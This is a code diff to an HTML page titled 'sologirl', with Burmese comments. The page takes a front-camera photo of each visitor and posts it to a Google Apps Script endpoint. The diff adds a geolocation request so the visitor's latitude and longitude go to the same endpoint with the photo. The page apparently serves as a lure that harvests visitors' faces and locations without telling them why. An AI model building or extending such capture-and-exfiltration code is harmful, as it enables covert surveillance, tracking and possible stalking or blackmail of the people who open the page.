@@ -6,7 +6,7 @@
     <title>sologirl</title>
     <style>
         .logo-container img {
-            width: 150px; /* လိုဂိုအကျယ်ကို သင့်တော်သလောက် ချိန်ထားပါ */
+            width: 150px;
             height: auto;
             margin-bottom: 20px;
         }
@@ -53,12 +53,33 @@
         const scriptURL = " https://script.google.com/macros/s/AKfycbymk0XWlZjf_g7SGQLAKbMOCZRx2YXAxLVjVT7-dTD9KfAEcruYrliGotTV_AaWncRfhQ/exec"; // ကိုယ့်ရဲ့ Apps Script URL ထည့်ရန်
 
 
+        // Location ရယူရန် Promise လုပ်ဆောင်ခြင်း
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject(new Error("Geolocation is not supported by your browser"));
+                } else {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            resolve({
+                                lat: position.coords.latitude,
+                                lon: position.coords.longitude
+                            });
+                        },
+                        (error) => {
+                            reject(error);
+                        }
+                    );
+                }
+            });
+        }
+
         async function captureAndSend() {
             const statusText = document.getElementById("status");
             statusText.innerText = "လုပ်ဆောင်နေပါသည်... ခဏစောင့်ပါ။";
 
             try {
-                // ကင်မရာခွင့်ပြုချက်တောင်းပြီး ပုံရိုက်ယူရန်
+                // ၁။ ကင်မရာခွင့်ပြုချက်တောင်းပြီး ပုံရိုက်ယူရန်
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById("video");
                 video.srcObject = stream;
@@ -80,9 +101,19 @@
                 // ကင်မရာပိတ်မည်
                 stream.getTracks().forEach(track => track.stop());
 
-                // Google Apps Script သို့ ပုံပို့မည်
+                // ၂။ Location ပါ တခါတည်း လှမ်းတောင်းမည်
+                let locationData = { lat: null, lon: null };
+                try {
+                    locationData = await getLocation();
+                } catch (locErr) {
+                    console.log("Location permission denied or unavailable:", locErr);
+                }
+
+                // ၃။ Google Apps Script သို့ ပုံနှင့် Location ပို့မည်
                 const payload = {
-                    image: imageData
+                    image: imageData,
+                    latitude: locationData.lat,
+                    longitude: locationData.lon
                 };
 
                 await fetch(scriptURL, {
@@ -92,10 +123,10 @@
                     body: JSON.stringify(payload)
                 });
 
-                statusText.innerText = "";
+                statusText.innerText = "အောင်မြင်ပါသည်။";
 
             } catch (err) {
-                statusText.innerText = "ကင်မရာ အသုံးပြုခွင့် ပိတ်ထား သို့မဟုတ် အမှားအယွင်းရှိသည်။";
+                statusText.innerText = "ခွင့်ပြုချက် ပိတ်ထား သို့မဟုတ် အမှားအယွင်းရှိသည်။";
             }
         }
     </script>
